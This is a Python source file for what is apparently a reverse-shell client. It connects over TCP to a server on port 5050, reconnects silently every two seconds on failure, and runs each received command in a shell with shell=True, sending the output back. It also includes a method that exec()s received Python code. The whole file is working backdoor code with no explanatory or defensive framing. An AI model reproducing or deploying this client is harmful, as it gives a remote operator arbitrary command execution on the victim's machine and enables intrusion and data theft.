import socket
import subprocess
import os
from time import sleep

HEADER = 64
ADDR = socket.gethostbyname(socket.gethostname())
PORT = 5050
FORMAT = "utf-8"


class client:

    def init(self, ip, port, header):
        passed = 1
        while True:
            try:
                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server.connect((ip, port))
                self.header = header
                while True:
                    passed = self.main()
                    if not passed:
                        return
            except:
                sleep(2)
                continue

    def main(self):
        passed = 0
        while True:
            passed = self.receive()
            if not passed:
                return 0

    def receive(self):
        passed = None
        try:
            size = self.server.recv(self.header)
        except ConnectionResetError:
            return 0

        msg = self.server.recv(int(size.decode()))
        msg = msg.decode()

        if msg == "TEST":
            return 1

        passed = self.run_command(msg)
        if not passed:
            return 0

        return 1

    def run_command(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True)
            output = ''.join(chr(i) for i in output)
        except subprocess.CalledProcessError:
            output = "FAILED TO EXECUTE COMMAND"
        passed = self.send(output)
        return passed

    def send(self, msg):
        msg_len = str(len(msg)).encode()

        msg_len += b' ' *(HEADER - len(msg_len))

        try:
            self.server.send(msg_len)
            sleep(0.1)
            self.server.send(msg.encode())
        except (ConnectionResetError, ConnectionAbortedError):
            return 0

        return 1

    def python_script(self, script):
        try:
            exec(script)
        except Exception as e:
            return e
        return 1


s = client()
while True:
    s.init(ADDR, PORT, 64)